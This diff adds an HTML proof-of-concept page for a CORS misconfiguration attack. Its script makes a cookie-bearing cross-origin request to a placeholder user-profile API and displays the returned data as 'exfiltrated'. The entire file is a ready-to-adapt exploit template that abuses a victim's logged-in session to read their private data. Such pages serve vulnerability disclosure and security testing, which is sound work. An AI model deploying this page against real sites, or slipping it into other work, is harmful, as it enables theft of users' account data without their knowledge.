@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Misconfiguration PoC</title>
+</head>
+<body>
+    <h2>CORS Exploit Proof of Concept</h2>
+    <p>Attempting to read data from the target site...</p>
+    
+    <script>
+        // Replace with the vulnerable API endpoint of the target
+        const targetUrl = "https://example.com/api/user/profile"; 
+
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", targetUrl, true);
+        
+        // This sends the victim's session cookies along with the request
+        xhr.withCredentials = true; 
+
+        xhr.onload = function () {
+            if (xhr.status === 200) {
+                // If successful, the sensitive data is leaked here
+                alert("Data Exfiltrated Successfully:\n\n" + xhr.responseText);
+                console.log(xhr.responseText);
+            } else {
+                alert("Failed to fetch data. Status: " + xhr.status);
+            }
+        };
+
+        xhr.send();
+    </script>
+</body>
+</html>
